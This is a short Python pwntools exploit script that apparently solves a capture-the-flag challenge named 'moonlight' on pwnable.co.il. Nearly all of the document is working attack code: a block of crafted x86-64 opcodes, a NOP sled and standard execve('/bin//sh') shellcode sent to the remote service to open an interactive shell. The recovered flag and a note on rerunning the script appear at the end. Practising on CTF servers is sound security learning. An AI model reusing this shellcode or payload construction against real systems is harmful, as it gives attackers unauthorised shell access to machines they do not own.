from pwn import *

MAX_LEN = 0xff

opcodes = [
    b'\x48\x85\x85\xe0\xfb\xff\xff'
    b'\x8b\x84\x85\xf0\xfb\xff\xff'
    b'\x83\xe0\x01'
    b'\x85\xc0'
    b'\x74\x0a'
    b'\xbf\x01\x00\x00\x00'
    b'\xe8\x20\xfe\xff\xff'
    b'\x48\x83\x85\xe0\xfb\xff\xff\x01'
    b'\x48\x81\xbd\xe0\xfb\xff\xff\xff\x00\x00\x00'
    b'\x76\xa5'
]

def main():
    ### run ###
    #p = process("./moonlight")
    p = remote("pwnable.co.il", 9008)

    ### payload start ###
    payload = b''.join(opcodes) 
    payload += b'\x90' * 5
    payload += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" #one gagdet
    payload += b'\x90' * (MAX_LEN - len(payload))
    print(payload)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()

#flag: PWNIL{I_guess_its_not_that_hard_after_all_if_you_did_it!}
#Note: you need to run it somtinmes until it will get random number with LSB set to 0